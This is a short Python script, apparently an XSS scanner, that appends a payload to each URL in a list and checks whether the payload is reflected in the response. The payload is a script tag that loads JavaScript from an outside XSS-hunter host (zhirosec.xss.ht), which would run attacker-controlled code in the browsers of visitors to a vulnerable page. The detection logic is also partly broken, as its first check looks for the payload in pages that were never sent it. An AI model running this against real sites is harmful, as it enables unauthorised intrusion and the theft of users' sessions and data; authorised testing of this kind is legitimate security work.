import requests

# Define the XSS payload to inject
xss_payload = '"><script src=//zhirosec.xss.ht></script>'

# Define the path of the file containing the list of URLs to check
url_file_path = "urls.txt"

# Open the URL file and read the list of URLs
with open(url_file_path, "r") as url_file:
    urls = url_file.read().splitlines()

# Iterate over the list of URLs and check for XSS vulnerabilities
for url in urls:
    # Send a GET request to the URL
    response = requests.get(url)

    # Check if the response contains the XSS payload
    if xss_payload in response.text:
        print(f"XSS vulnerability found in {url}")
    else:
        print(f"No XSS vulnerability found in {url}")

    # Attempt to inject the XSS payload on the URL
    payload_url = url + xss_payload
    payload_response = requests.get(payload_url)

    # Check if the response contains the injected XSS payload
    if xss_payload in payload_response.text:
        print(f"XSS payload successfully injected in {url}")
    else:
        print(f"Failed to inject XSS payload in {url}")
